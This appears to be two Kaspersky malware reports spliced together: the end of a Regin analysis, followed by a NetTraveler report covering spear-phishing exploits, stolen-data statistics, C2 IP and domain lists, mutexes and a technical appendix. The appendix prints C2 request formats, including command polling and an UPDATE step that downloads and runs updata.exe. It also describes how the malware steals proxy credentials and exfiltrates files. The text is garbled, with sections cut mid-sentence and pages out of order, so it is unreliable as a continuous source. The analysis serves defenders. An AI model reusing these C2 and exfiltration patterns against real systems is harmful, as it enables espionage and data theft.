the network with C&Cs on the Internet.After decoding all the configurations we have collected, we were able to identify the following external C&Cs.It was rather astonishing, so we thought it should be
mentioned.In this country all the victims we identified communicate with each other, forming a peer-to-peer
network.The P2P network includes the president’s office, a research center, an educational institution
network and a bank.Spread across the country, these victims are all interconnected with each other.One of the victims contains a
translation drone, which has the ability to forward packets outside the country, to the C&C in India.This represents a rather interesting command-and-control mechanism, which is guaranteed to raise little suspi-
cion.For instance, if all commands to the president’s office are sent through the bank’s network, then all the
malicious traffic visible to the president’s office sysadmins will only be with the bank, in the same country.<figure></figure>
</section>

<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
22</noncontent>



<header>Victim statistics</header>
<section>
Over the past two years we have been collecting statistics on the attacks and victims of Regin.These were
aided by the fact that even after the malware is uninstalled, certain artifacts are left behind, which can help
identify an infected (but cleaned) system.For instance, we have seen several cases where the systems were
cleaned but the ‘msrdc64.dat’ infection marker was left behind.The number of unique PCs infected with Regin is of course
much, much higher.From the map above, Fiji and Kiribati are unusual, because we rarely see such advanced malware in such
remote, tiny countries.In particular, the victim in Kiribati is most unusual.To put this into context, Kiribati is a
small island in the Pacific with a population around 100,000.According to experts, Kiribati is probably going to
become one of the first victims of global warming, as it will be under water by 2050.(http://www.businessin-
sider.com/pacific-island-nation-kiribati-sinking-2014-5?op=1)
</section>


<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
                                                                                                                    23</noncontent>



<header>Attribution</header>
<section>
Considering the complexity and cost of Regin’s development, it is likely that this operation is supported by a nation
state.While attribution remains a very difficult problem when it comes to professional attackers such as the ones
behind Regin, certain metadata extracted from the samples is still worth a look.We have collected timestamps from samples, which are normally put automatically by the development software:




As this information could be easily altered by the developers, it is up to the reader to attempt to interpret this: as
an intentional false flag, or a non-critical indicator left by the developers.More information about Regin is available to Kaspersky Intelligent Services’ clients.Contact: intelreports@kaspersky.com
</section>

<header>Conclusions</header>
<section>
For more than a decade, a sophisticated group known as Regin has targeted high-profile entities around
the world with an advanced malware platform.As far as we can tell, the operation is still active, although
the malware may have been upgraded to more sophisticated versions.The most recent sample we have
seen was from a 64-bit infection.This infection was still active in the spring of 2014.The name Regin is apparently a switched around ‘In Reg’, short for ‘In Registry’, as the malware can store its
modules in the registry.This name and the detections first appeared in anti-malware products around March
2011.In some ways the platform reminds us of another sophisticated malware: Turla (http://securelist.com/analysis/
publications/65545/the-epic-turla-operation/).Some similarities include the use of virtual file systems and the
deployment of communication drones to bridge networks together.Yet through their implementation, coding
methods, plugins, hiding techniques and flexibility, Regin surpasses Turla as one of the most sophisticated
attack platforms we have ever analyzed.The ability of this group to penetrate and monitor GSM networks is perhaps the most unusual and interesting
aspect of these operations.In today’s world, we have become too dependent on cellphone networks that rely on
ancient communication protocols with little or no security available for the end user.Although all GSM networks
have mechanisms embedded that allow entities such as law enforcement to track suspects, there are other
parties which can gain this ability and then abuse it to launch other types of attacks against mobile users.Kaspersky Lab products detect modules from the Regin platform as: Trojan.Win32.Regin.gen and Rootkit.Win32.Regin.Hashes are provided for
research purposes only.Executive Summary</header>



<section>
      <heading>1.Executive Summary</heading>

This report describes multiple cyber-espionage
campaigns that have successfully compro-
mised more than 350 high profile victims in 40
countries.The focus of the paper is to describe
NetTraveler, which is the main tool used by the
threat actors during these attacks.The name “NetTraveler” comes from an internal
string which is present in early versions of the    
malware: “NetTraveler Is Running!”.This mal-       
ware is used by APT actors for basic surveillance   
of their victims.Earliest known samples have a     
timestamp of 2005, although references exist        
indicating activity as early as 2004.The largest   
number of samples we observed were created          
between 2010 and 2013.Known targets of NetTraveler (also known as         
‘Travnet’ or “Netfile”) include Tibetan/Uyghur      
activists, oil industry companies, scientific re-   
search centers and institutes, universities,        
private companies, governments and govern-          
mental institutions, embassies and military con-    
tractors.The NetTraveler backdoor is often used together     
with other malware families.During the anal-       
ysis of one of the command and control (C&C)        
servers, we observed how the attackers de-
ployed different backdoors to the victims’ ma-
chines.These include the malware known as
“Saker” also known as “Xbox” (known filenames: 
“update.exe”, “updata.exe” or “xbox.exe”) and                                   
“PCRat” / ”Zegost”.This report includes a full
description of the “Saker/Xbox” backdoor as
well.The attacks use spear-phishing e-mails with
malicious Microsoft Office documents as attach-
ments.Gathered data includes file system list-
ings, keylogs, various types of documents (.doc,
.xls, .ppt, .pdf, etc...) and other private informa-
tion.We have calculated the amount of stolen
data stored on C&C servers to be 22+ gigabytes.However this data represents only a small frac-
tion which we managed to see - the rest of the
it had been previously downloaded and deleted
from the C&C servers by the attackers.</section>
                                                                                                      
<footer>3</footer>
                                                                                     
<header>The NetTraveler</header>


<section>

       <heading>2.Attack analysis</heading>

     NetTraveler victims get infected through spear-phishing attacks using Office documents
     which exploit two publicly known vulnerabilities -- CVE-2012-0158 and CVE-2010-3333.Although these vulnerabilities have been patched by Microsoft, they remain effective and
     are among the most exploited in targeted attacks.During our analysis, we did not see any advanced use of zero-day vulnerabilities or other
     malware techniques such as rootkits.It is therefore surprising to observe that such un-
     sophisticated attacks can still be successful with high profile targets.The development of this version of           
the exploit delivers a large, easily identified       
“0x4141” NOP sled prior to its shellcode, shed-       
ding some light on the immaturity of the devel-       
opment behind the effort.More interesting is         
that the target in India received this file titled
“Army Cyber Security Policy 2013.doc”, and
the accompanying benign and empty decoy
Word document is dropped to the temp folder
and opened with Word as “Jallianwala Bagh
massacre a deeply shameful act.doc” (MD5:
e617348b8947f28e2a280dd93c75a6ad).</section>

<footer>4</footer>

<header>2.Attack analysis</header>

<section>


<heading>Kaspersky Lab verdict: Exploit.MSWord.<table>                                                
                     b600089a93275fa935         
 MD5                 58695b707b87ad             
 Create date (GMT)    2011-04-27 10:10:00
                                                
 Size                 274,291
 Vulnerability
 Targeted             CVE-2010-3333             
 
</table> 

Filename: “invitation.doc”
Decoy filename: “mailnew.doc” (empty)
</section>

<section>           
<heading>Kaspersky Lab verdict: Exploit.MSWord.Attachment filename: “His Holiness the Dalai         
Lama’s visit to Switzerland Day 3.doc”                
Decoy filename: “His Holiness the Dalai Lama’s        
visit to Switzerland Day 3.doc”                       
</section>

<section>                              
<heading>Kaspersky Lab verdicts: Exploit.MSWord.CVE-2010-3333.ci</heading>                                      

<figure></figure>
<caption>Multiple decoy images depicting a large Tibetan
audience, and the Dalai Lama speaking</caption>
Drops:
   >>%AppData%\Adobe\netmgr.dll 
   >>%AppData%\Adobe\netmgr.exe
   >>%AppData%\Adobe\perf2012.ini
   >>%AppData%\Adobe\sysinfo2012.dll
   >>%AppData%\Adobe\enumfs.ini
   >>%temp%\winlogin.exe

<figure></figure>

<footer>6</footer>

<header>2.The malware
     uses compression techniques and a fail-safe protocol to ensure that uploaded data is
     safely transferred to the attacker’s C2s.By default, NetTraveler exfiltrates common file   
types such as DOC, XLS, PPT, RTF and PDF.For     
a full list, see the detailed backdoor analysis   
below.The backdoor configuration can however     
be extended with special options to steal other
file types.Here’s one such extended configura-   
tion recovered from an attack against a victim    
working in the oil industry:                      
                                                  
It is clear that the attackers are also collecting
files of type “.cdr” (Corel Draw designs), “.dwg”,
“.dxf”, “.cdw”, “.dwf” (AutoCAD projects) and
some configuration files “.cfn” and “.cfg”.The various parameters of the malware are configured
with a builder, which allows the attackers
to change things such as the list of stolen files
extensions, C2 address and so on:

<figure></figure>

<footer>10</footer>

<header>2.Attack analysis</header>


<figure></figure>

      <caption>NetTraveler configuration GUI</caption>

</section>
<section>
                        <heading>2.4 Exfiltrated data</heading>

    Exfiltrated data is encoded with a custom compression and encoding library, which pro-
    duces files which resemble BASE64.Although         
we see no direct links between the NetTraveler        
attackers and the Red October threat actor, the       
existence of victims infected by both of these        
campaigns is interesting.</section>

<section>
  <heading>2.6 Connections with
            other campaigns</heading>
To better identify core NetTraveler actors and
delineate the groups from one another, we
collect and categorize various Tactics, Techniques,
and Procedures (TT Ps) employed by
these adversaries throughout their operations.The attacker’s IP operation ranges, overlaps
with that of a malware family known as “Zegost”.For instance, one of the command and
control servers that is part of the infrastructure,
is a well-known C2 for multiple Zegost
variants, still active as of May 2013.The targets
and command and control domain naming
scheme indicates a connection between the
Lurid/Enfal attackers and NetTraveler.Some
of the NetTraveler C2’s are used to distribute
a malware known as “Saker” or “Xbox”, which
is delivered as an “update” to the NetTraveler
victims.Note: more details about the connections
between NetTraveler and other campaigns
is available in our private report.Contact
us at intelreports@kaspersky.com for more
details.</section>

<footer>12</footer>

<header>3.Command and control servers and infrastructure</header>



<section>
      <heading>3.Command and control
         servers and infrastructure</heading>
      During our monitoring period, we observed more than 100 command and control URLs,
      pointing to multiple servers in the United States, China and Hong Kong.The command and control servers generally run
IIS 6/7, as the C2 backend is an ASP (Microsoft         
Active Server Pages) script.To transfer stolen data from the command and            
control servers, the attackers use FTP on top           
of VPN connections through a server in the US           
hosted by Krypt Technologies.The infrastructure        
is secured by allowing FTP access only to remote        
users coming from predefined IPs, including the         
VPN provider in the US.During our investigation, we analyzed several
hundred NetTraveler samples and configuration
files, which use more than 30 different C&C serv-    
ers.The list below includes the script names that   
we have seen on these servers and confirmed          
as malicious:

<figure>
aasogspread.asp, adfsdfclnggsldfc.asp,
advertisingservicesa3sb.asp, aneywsf.asp, apple.asp, applebag005.asp,
azarweforrell.asp, azofjeljgo648rl.asp,
certify.asp, dochunter.asp, dochunter1.asp,
dochunteradfaefaer.asp, fish.asp, happy.asp, heritage.asp, huyuio67.asp, little.asp,
madmaswhbe.asp, nethttpfile.asp, netpass.asp, nettraveler.asp, orphaned.asp, rice.asp,
sabcfsf.asp, shenghai.asp, time.asp, update.asp, weathobloe.asp, yegnfvhemc.asp
</figure>

All the known command and control servers perform
the same basic functions - for a description
of the supported functionality, see below.<footer>13</footer>
     
<header>The NetTraveler</header>


<figure></figure>
</section>
<footer>14</footer>

<header>3.Command and control servers and infrastructure</header>

<section>

      <heading>3.1 Description of C2 script functionality</heading>


    The main function of Command and Control servers is to collect stolen data from the
    victims.Stolen data is stored in the exact format it was sent from the victim’s PC, without
    any additional encoding or obfuscation.Here’s a listing of how a folder storing stolen victim data could look on the C&C server:

  <figure></figure>


   The uploaded data can be either a document file, a keylogger backlog or a system infor-
   mation profile.Here’s how a decoded system information profile looks like:




<footer>15</footer>
                                                                                     
<header>The NetTraveler</header>

<figure></figure>

   <caption>System profile, filename is of the form ‘@@@dll@@@travlerbackinfo-[date/time].bak’</caption>

     The system profile includes an IPCONFIG output as well as a list of user accounts in the
     machine.If the malware install includes the “NetPass” module, a keylogger will silently
     collect all typed data, together with window names.This produces logs like the following
     (in decoded format):


<figure></figure>

    <caption>Sample decrypted log from the keylogging module</caption>


<footer>16</footer>

<header>3.Command and control servers and infrastructure</header>


      The command and control scripts implement several functions to communicate with the
      victim; during our analysis, we observed four different generations of these scripts, with
      various degrees of complexity.The main function of the C&C script saves stolen data to
      a folder in the C2 root, unless the request variable “action” is defined, in which case, it
      performs one of the following commands:
<table>

  Command           Purpose                                                                  Script
  “action”)                                                                                  generation
                    Read list of commands from the configuration file (eg.“nettraveler.txt”) and send it to the victim.Commands can be “UNINSTALL”,
  getdata                                                                                    nettraveler.asp
                    “RESET”, “UPDATE”, “UPLOAD”.For a description of these com-
                    mands see the technical appendix.updated           Report to the C2 a successful exfiltration of victim’s data.nettraveler.asp
  getemail          Read a template file (eg.“email.eml”) and send to victim                nettraveler.asp
  gotemail          Delete template from C2 (“email.eml”)                                    nettraveler.asp
  datasize          Report filesize of additional backdoor module (eg.“updata.exe”)         nettraveler.asp
                    Get specific individual commands to be executed on the victim’s
  getcmd                                                                                     nettraveler.asp
                    machine.gotcmd            Delete specific individual command for the victim from the C2            nettraveler.asp
                    Send a specific text file from the C2 to the victim (eg.“nethttpfile.In case of errors, the
malware continues to send the data over and
over, until they succeed.</section>

<footer>17</footer>
                                                                               
<header>The NetTraveler</header>



<section>
     <heading>4.Global infection statistics</heading>

     During our analysis, we obtained infection logs from several command and control
     servers.The logs, which go back as far as 2009, show that the threat actors behind
     NetTraveler successfully infected more than 350 victims in 40 countries.The following
     map shows the locations and profile of the victims:

<figure></figure>


<footer>18</footer>

<header>4.We will continue
to monitor the connections and over time, update
this paper with more data as it becomes
available.Note: Taking into account that several other C&C
servers exist for which we have no logs and the KSN
coverage, we estimate the total number of victims
worldwide to be around ~1,000.</section>

<footer>19</footer>
                                                                              
<header>The NetTraveler</header>



<section>
    <heading>5.Mitigation information</heading>

From the point of view of the victims, the most    
important part of any report is information on     
how to detect and eradicate the infections.In     
addition to running a modern security suite ca-    
pable of detecting NetTraveler, things such as     
filenames or C2 IPs can be extremely useful to     
system administrators.west263.cn)                                   
  >>61.178.77.111 - C2 (wolf0.3322.org)            
  >>182.50.130.68 - C2 (viprambler.com)            
  >>103.20.192.59 - C2 (sunshine.59.ydli.net)      
  >>213.156.6.122 - C2 (cultureacess.com)
  >>209.130.115.38 - C2 (tsgoogoo.net)
  >>98.143.145.80 - C2 (spit113.minidns.net)
  >>96.46.4.237 - C2 (sghrhd.190.20081.info)
  >>109.169.86.178 - C2 (imapupdate.com)
  >>125.67.89.156 - C2 (faceboak.net)
  >>142.4.96.6 - C2 (buynewes.com)
  >>124.115.21.209 - C2 IP
  >>67.198.140.148 - C2 (southstock.net)
  >>9 6.4 4.179.26 - C 2 (vip222idc.s169.288idc.com)
  >>235.22.123.90 - C2 (gami1.com)
  >>178.77.45.32 - C2 (ra1nru.com)

  Command and control domains and server
  names:
  >>allen.w223.west263.cn
  >>andriodphone.net
  >>bauer.8866.org
  >>buynewes.com
  >>cultureacess.com
  >>discoverypeace.org
  >>drag2008.com
  >>eaglesey.com
  >>enterairment.net
  >>faceboak.net


<footer>20</footer>

<header>5.ini                                       
     • C :\ DOCUME~1\< USER > ~1\ LO             
       CALS~1\Temp\RECYCLER_w\AllIndex.ini_d                                     
                                                 
Mutexes created during backdoor operation:       
  >>Boat-12 Is Running!>>DocHunter2012 Is Running!>>Hunter-2012 Is Running!>>NT-2012 Is Running!>>NetTravler Is Running!>>NetTravler2012 Is Running!>>SH-2011 Is Running!>>ShengHai Is Running!*
  >>Trojan.Multi.Yahg.a
  >>Trojan.Win32.Agent2.eakj
  >>Trojan.Win32.Agent2.exms
  >>Trojan.Win32.Agent2.ezgb
  >>Trojan.Win32.Agent2.fdhs
  >>Trojan.Win32.Delf.dgmw
  >>Trojan.Win32.Delf.dgmx
  >>Trojan.Win32.Genome.agyil
  >>Trojan.Win32.Genome.aiunu
  >>Trojan.Win32.Genome.ajeqr
  >>Trojan.Win32.Genome.akqco
  >>Trojan.Win32.Genome.aksho
  >>Trojan.Win32.Jorik.TravNet.*
  >>not-a-virus:Downloader.Win32.NetTrav
    eler.*                                                 
           </list>                                      

<footer>22</footer>

<header>5.The       
main targets of the group include government        
institutions, embassies, oil and gas industry,      
research institutes, universities, private com-     
panies, military contractors and activists.The     
group’s domains of interest include space ex-
ploration, nanotechnology, energy production,       
nuclear power, lasers, medicine and communi-        
cations between others.Although not very advanced, the NetTtraveler        
attackers have successfully compromised hun-
dreds of targets around the world, with the high-
est number in Mongolia, India and Russia.The group using NetTraveler is also employing
other malware, including Zegost, Saker and oth-
ers.To compromise their victims, they rely on
exploits for two popular vulnerabilities in Mic-
rosoft Office.Based on collected intelligence, we estimate the
group size to about 50 individuals, most of which
speak Chinese natively and has knowledge of
English language.By publishing this report we would like to raise
awareness of all organizations and individuals
who might become a victim of these attackers.We would like to encourage people of all coun-
tries to learn something from this report, check
their systems and be prepared for potential fu-
ture cyberattacks against them.More information on attribution and victims will
be available to selected parties, including lo-
cal authorities of victim countries.For details,
please contact us at intelreports@kaspersky.com.Its main pur-       
pose is to drop a DLL file and register it as a sys-   
tem service.The malware looks up a suitable           
service name from one of the values in the reg-        
istry.This module also drops an INI-type file with the       
configuration that is later used by the NetTrav-       
eler backdoor.</section>

<section>                                          
        <heading>Technical Details</heading>
Execution of the module starts with the creation
of a system mutex object called “INSTALL SER-
VICES NOW!”.If this mutex already exists the
module quits to avoid duplicate instances of the
same module from running.After that, the module creates the configura-
tion file named %WINDIR%\system\config_t.dat
which is populated with the strings embedded in
the body of the executable and encrypted with
simple one-byte XOR (0x3E).DownCmdTime              
is the delay in minutes between requests sent           
to the C&C server.The code of the function to dump the INI file           
is designed to process several cases.There is          
1 byte value for variable UP (which stands for          
“Use Proxy”) from section [Other].</list>
The module then queries registry value at
HKLM\SOFTWARE\Microsoft\Windows
NT\\CurrentVersion\Svchost\netsvcs which
is a multi-string type of value.Then it iterates
through the names of services in that value to
find a special service name.It must not be the
“6to4” service and there must not be registry
key HKLM\SYSTEM\CurrentControlSet\Ser-
vices\<servicename>.On Windows XP services that match the de-
scribed criterias are (eg.)“Ias”,”Iprip”, “Irmon”
and a few others.These names are different on
other Windows OS and even depend on installed
features or Service Packs.The malware takes
the first matching service name and uses it.Right after that, the malware attempts to delete
%WINDIR%\system32\<servicename>ex.dll and registers a new system service with the
same name <servicename>.The service is
designed to be a Win32 shared process like
svchost, autostarted by system service control
manager during system boot.That creates cor-
responding system registry values in HKLM\
SYSTEM\CurrentControlSet\Services\<ser-
vicename>.After that the module creates the C:\WIN-             
DOWS\system32\<servicename>ex.dll file                
on disk and sets hard-coded file creation and         
last access date and time to “20:00 17 August         
2004”.The new file is then filled with data produced        
after decryption of the hard-coded data block.It has one export function
ServiceMain which has the main functionality of
the module.This module has initial filename assigned during
compilation: “DLL.dll”.</section>

<section>
          <heading>Technical Details</heading>
Upon start the module sets corresponding ser-
vice status to “Start_Pending” and then imme-
diately to “Running”.It checks if system mutex named “NetTravler Is
Running!” exists and terminates if that is true.Note: Other known mutexes used by variants of
NetTraveler include:
<list>
  >>Boat-12 Is Running!>>DocHunter2012 Is Running!>>Hunter-2012 Is Running!>>NT-2012 Is Running!>>NetTravler Is Running!>>NetTravler2012 Is Running!>>SH-2011 Is Running!>>ShengHai Is Running!The module submits the request and reads the       
response of the server.The response is stored     
in newly allocated memory block.After that the malware appends debug output
to the log file named <modulename>.log.</section>

<section>
            <heading>Finding Proxy
                 Configuration</heading>
First, the module lists contents of %PROGRAM-
FILES% directory and appends the listing to the
log file.Then it opens IE history file of the current user
(History.IE5\index.dat) parses it and appends
the log with discovered logins/password saved
in the the history file as a part of visited URLs.After that the module logs current version of
Internet Explorer.Interestingly that the log file is
appended with the following hard coded string:

“IE版本: Internet Explorer “, 版本 means “ver-
sion” in Simplified Chinese.<footer>30</footer>

<header>Appendix A: Malware technical analysis</header>


The module reads IE version from HKLM\Soft-         
ware\Microsoft\Internet Explorer\Version reg-       
istry value.Then it gets version of current OS, and again
appends the result to the log file with some hard   
coded strings in it:                                
                                                    
“操作系统版本” which means “version of oper-          
ating system” in Simplified Chinese.There were four different methods to find proxy     
configuration on the system according to the log    
file messages set in three functions.One of the    
function (method 2) was probably merged with
another one (method 3) in newer variant of the
malware.</section>

<section>
                  Method 1:
This is a straightforward attempt to connect to
the test url, assuming that system-wide proxy
settings are correct or no proxy is required to
access the external website.The URL for testing
is http://www.microsoft.com/info/privacy_
security.htm with the following header values:
<list>
Accept: image/gif, image/x-xbitmap, image/
jpeg, image/pjpeg, application/x-shock-
wave-flash, */*
Accept-Language: en-us
Proxy-Connection: Keep-Alive
Pragma: no-cache
</list>
If the method succeeds the module appends
received data from the URL to the log file and
corresponding parameter is set in the INI file
(UP=0).If something fails the following message is ap-
pended to the log file: “Method1 Fail!!!!!”
</section>

<section>
           Method 2 and Method 3:
This method is used when the infected machine
uses proxy server but the settings are not avail-
able for local SYSTEM user.A user working at



<footer>31</footer>
                                                                                      
<header>The NetTraveler</header>


the infected machine might have internet ac-          
cess and should have the required proxy server        
settings.The malware list all processes running on the         
machine and locates process named “EXPLOR-            
ER.EXE”.This process is a system shell which is      
normally running after local user successfully        
authenticates and logs in to the system.The          
malware finds explorer process and obtains se-        
curity token which is later used to temporarily
impersonate as local user and get proxy con-          
figuration with InternetQueryOptionA(0,INTER-         
NET_OPTION_PROXY,...) API call.If the result contains proxy settings the malware     
gets them.If for some reason local proxy set-        
tings were not found in current user profile, the     
malware attempts to double-check and opens            
IE settings in the registry.It iterates through all stored local     
user secrets via CredEnumerateA and looks for
those which start with “Microsoft_WinInet_” and
contain the address of the proxy server previ-
ously obtained.These secrets are decrypted
with CryptUnprotectData API call.Such call is
possible only after impersonation as local user
which is available for the malware running with
local system privileges.This method checks the
first available password in the list of passwords
from the system stored secrets.Once the potential server, port, login and pass-
word are obtained the malware makes a test
query to the same URL: http://www.microsoft.com/info/privacy_security.htm.If it succeeds
the content of this page is appended to the log
file with all details about the proxy server.If the
method fails it prints the following line in the log
file: “Method3 Fail!!!!!”
</section>

<section>
                   Method 4:
This method is identical to Method 3 with just
one difference: it checks the last available pass-
word in the list of passwords from the system
stored secrets.</section>
<section>
              Method X (debug):
There is also an unused method in the code with
no internal number, which was most likely used
to debug the application as it writes all interme-
diate results to the log file, starting from string



<footer>32</footer>

<header>Appendix A: Malware technical analysis</header>


“Get From IEOption!” or “Get From Reg!” de-           
                                                      
pending on the path of code execution.Right after that it enters an    
infinite loop of doing nothing but sleeping which     
can be interrupted by a special value in global       
variable set by other threads.Upon detecting         
this value the service routine ends which termi-      
nates the service execution.**%)
Disk Space: Total disk space ***GB, the remain-
ing disk space ***GB (**.**%)
CPU: <CPU Type> <CPU Frequency>MHZ
物理内存: 总物理内存:***MB,可用内存:***MB (
占**.**%)
</list>

<footer>33</footer>
                                                                                       
<header>The NetTraveler</header>


Physical Memory: Total physical memory: ***MB        
of available memory: ***MB (**.Please note that
the serial number of current disk drive (most
likely it is drive “C”) is used in HTTP query value
hostid.This identifier derived from the local
filesystem is used later as a reliable identifier of
current infected machine or simply BotId.</section>

<section>
              The Control Loop
After that it enters control loop.Every 10 minutes
according to the DownCmdTime parameter val-
ue in the config file, it sends HTTP GET request
of the following format:
<list>
GET /nt12/new york /cit y/nettraveler.asp?ac
tion=getcmd&hostid=<DriveCSerialNumber>&host
name=<Hostname>
…
If the server response starts with “[CmdBegin]”
and ends with “[CmdEnd]” then the response
is saved in C:\Windows\System32\stat_t.ini file.After that the code confirms receiving
the command by submitting another HTTP GET
request in the format below:
GET /nt12/newyork/city/nettraveler.asp?action=
gotcmd&hostid=<DriveCSerialNumber>&hostname
=<Hostname>
…
</list>

<footer>34</footer>

<header>Appendix A: Malware technical analysis</header>


The module expects server to reply “Success”.If          
it doesn’t the module will try again in 10 minutes.If the server was notified and confirmed receiv-          
ing the notification, the module reads stat_t.</section>                                                     

<section>                                                     
                Filesystem Scan                      
The malware has a file enumeration routine,          
which gets the settings from dnlist.ini (such as
directory paths to process) and launches a re-       
cursive directory search.Only di-
rectory/file names are stored, with no addition-
al data such as timestamps or size.When the
search is finished, the module saves current
date to the dnlist.ini file and changes option
ScanAll, see format below.This is done to avoid
recurrent scanning of the filesystem, which is
normally a heavy process and might be noticed
by local user or an administrator.<code>
[EnumTime]
DateTime=<YYYY-MM-DD date>
[ScanList]
ScanAll=False
</code>

<footer>36</footer>

<header>Appendix A: Malware technical analysis</header>


After scanning the local filesystem, enumfs.This         
process is described below.The module works with files described in dnlist.ini file.It gets a list of file extensions that must
be uploaded to the C&C first.There is a default        
list of extensions (value Types of section [Oth-        
er]) that represent interest for the attackers:         
doc,docx,xls,xlsx,txt,rtf,pdf.Then it gets file-       
total values from [FileList] section of dnlist.ini      
and iterates through every f<N> value, where N
is a positive integer starting from 1.There are several tests applied to each file, be-       
fore it is uploaded to the server, including the        
following:

<list>
  >>File size must not be larger than ~10Mb             
    (10’485’760 bytes).>>File must have one of the extensions from           
    the “Types” option.</list>
If the file matches the criterias, then a unique
file state identifier for that file is created,
which is an MD5 hash of the following string:
“<Filename> <Year>-<Month>-<Day>
<Hour>:<Minute>:<Second>:<Millisec-
onds>”.The date and time values in the string
before are obtained from the file last change
time.After that the module creates a name used for
uploading the file to the server, which consists
of the following: “<Year>-<Month>-<Day>-
<Hour>-<Minute>-<File state identifier, the
MD5>”.The time and date values are also taken
from the file’s last change time.This file is up-
loaded to the C&C using the same procedure as
used before for uploading other files.After that, Thread1 attempts to upload a file called
uenumfs.ini, which is created by the Thread2.The
remote filename is set to the following “UFileL-
ist-<Month><Day>-<Hour><Minute><Sec-
ond>.ini”.Next, the thread iterates through %TEMP%\
ntvba00.tmp\ directory and uploads every file
located there.The file names are preserved as
they are.</section>

<section>
             Control Procedure
Then, the thread issues a special HTTP GET re-
quest to get next control instruction from the
C&C.This is done by accessing the following URI:


<footer>37</footer>
                                                                                    
<header>The NetTraveler</header>

<list>
hXXp://vip222idc.s169.288idc.com/nt12/newyork/       
city/nettraveler.asp?action=getdata (3)              
        </list>                                             
Server response is converted to uppercase and        
analyzed.There is defined set of responses ex-      
pected from the C&C server:

<list>
  01.<BotId>:UNINSTALL                              
</list>

This command simply uninstalls the malicious         
service from the registry and deletes locally cre-   
ated files.<list>                                                
  02.<BotId>:UPDATE                                 
     </list>                                                
This procedure starts from uninstalling current      
service, then it issues three HTTP GET requests      
to the C&C script URL:                               

<list>
GET .../newyork/city/nettraveler.asp?action=data-    
size to get the size of updated module that will     
be pushed with next request.GET .../newyork/city/../updata.exe to get the up-    
dated module to be executed.This module is          
instantly saved to %WINDIR%\install.exe and
executed.</list>                                        
        <list>                                             
  03.<BotId>:RESET                                  
        </list>                                             
This procedure simply removes all temporary
files, such as the following:
<list>
  >>%SYSDIR%\enumfs.ini
  >>%SYSDIR%\dnlist.ini
  >>%SYSDIR%\udidx.ini
  >>%SYSDIR%\uenumfs.ini
  >>%SYSDIR%\stat_t.ini
</list>
<list>
  04.<BotId>:UPLOAD
</list>
This procedure is identical to the UPDATE com-
mand described before with one difference - no
uninstallation of the current module is done, only
new executable is downloaded and started.This
method is probably used to execute additional
independent malicious executable, unrelated
to the original NetTraveler malware.Or it can
be used to infect with the NetTraveler backdoor
configured for some other C&C server.After processing any of the commands above
the malware issues the following request to the
server to confirm command execution:
<list>
GET .../newyork/city/nettraveler.asp?action=updat-
ed&hostid=<BotId>
</list>
If the server hasn’t issued the UNINSTALL com-
mand the thread continues execution starting
from the beginning of The Control Loop (see
above).</section>

<footer>38</footer>

<header>Appendix A: Malware technical analysis</header>

<section>
   <heading>Thread2 (Drive Monitoring Thre ad)</heading>
This thread creates a hidden window with class       
name “NTMainWndClass” and processes win-             
dow messages in a loop until it is interrupted by    
special variable value.The window procedure         
processes only one window message, WM_DE-            
VICECHANGE with wParam value set to DBT_             
DEVICEARRIVAL, which is sent by the system
when a new removable device such as USB flash        
drive or Network shared folder is attached to        
the system.The module will proceed only if the attached         
removable device has provided a disk volume.It is designed to have different procedures for      
removable disk drives from USB flash and net-        
work shares.The USB drives will be processed only if GSearch     
value is set to True in [Other] section of dnlist.ini file.Similarly, a new network drive will be     
processed only if USearch value is set to True       
in [Other] section of dnlist.ini file.Both network and removable USB drives are            
processed in the same procedure, which reads         
the following values from dnlist.ini file:           

<code>
[Other]                                              
UTypeLimit=<boolean, default True>                   
UAuto=<boolean, default False>
</code>

If UAuto option is set to True, the thread creates   
%TEMP%\ntvba00.tmp\ directory and opens              
uenumfs.ini file for writing.The latter is filled
with directories and subdirectories listings of the
attached disk drive.The format of the data in
uenumfs.ini is almost identical to the one created
during fixed drive filesystem scan (see “Filesys-
tem Scan” part in Thread1 description above).In addition to that, the same criterias are applied
to each file (size and file extension) as in fixed
drive filesystem scan.Also, every file gets a state
id calculated as MD5 hash of the filename and
timestamp of the last modification.This hash
is used to generate a new filepath in the follow-
ing format: %TEMP%\ntvba00.tmp\<Year>-
<Month>-<Day>-<Hour>-<Minute>-<File
state id, MD5 hexadecimal string>.<Original
extension>.The source file from newly attached
drive is then copied to the destination set by the
generated file path.Please note, that the file orig-
inal extension is preserved, while the file name is
changed.That is used to prevent further problems
when working with unsupported encoding.At the same time when file is copied to ntvba00.tmp directory, a record is added to udxidx.ini
file, which has the following format:

<code>
[Index]
<File state id, MD5 hexadecimal string>=1
</code>

This is done to avoid copying files that were al-
ready copied before, unless they were changed
by the user.<footer>39</footer>
                                                                                      
<header>The NetTraveler</header>




To avoid excessive use of the disk drive and oc-      
casional interest of the local user, the file copy-   
ing procedure has a delay.Every 1000 files the       
thread delays execution and sleeps for 9 sec-         
onds.</section>                                                      
<section>                                                      
            <heading>Side notes</heading>                          
Useless text transformation                           
In function which gets disk volume serial num-        
ber the actual serial number is converted from a      
decimal integer to a hexadecimal number stored        
as an ASCII string.The integer is converted to
a string with call to the “sprintf’ function and
“%8X” parameter which outputs 8 characters
representing a number in hexadecimal form.Despite the fact that the output of this call is in
uppercase, the author of the module converts
the output to uppercase characters again.This
could be due to the fact that the author used to
have “%8x” format string before, which made
such conversion rational.However, that clearly
shows that the developer wasn’t aware of vari-
ous format strings options, which shows lack of
experience in C/C++ development.<figure></figure>

<footer>40</footer>

<header>Appendix A: Malware technical analysis</header>


Drive monitoring disk processing issue              
As we mentioned above the drive monitoring          
thread uses the same function to process
removable USB drives and network shares
attached as local drives.Visible separation of
these two types of disk drives (in the name of
the options GSearch and USearch, where “U”          
probably stands for “USB” and “G” is for “Glob-
                                                    
al”, and in separate logical branches of code
flow) is later misused, as the drive processing     
                                                    
                                                    
routines is bound to USB drives.At least it read
                                                    
U-prefixed options from dnlist.ini file, which
                                                    
logically corresponds to the USB-type of disk
                                                    
                                                    
drive, but used for both.While this is a minor     
issue and probably didn’t cause a serious
problem for the attackers, this shows that the
developer felt lazy at some point and used          
Copy and Paste approach to avoid creating           
extra code.It could also mean that one part of     
the code was created by one person and later        
modified by another, who mistakenly over-           
looked general code design.Data decompression routine                          
The malware uses a custom data compres-
sion algorithm when uploading files to the
C&C server.While the decompression is not          
required for the work of the application, the       
code for the decompression routine was also         
found in the malicious module.This clearly         
indicates a design flaw and shows that the de-
veloper didn’t review the code on a binary level
after it was compiled, which is common among
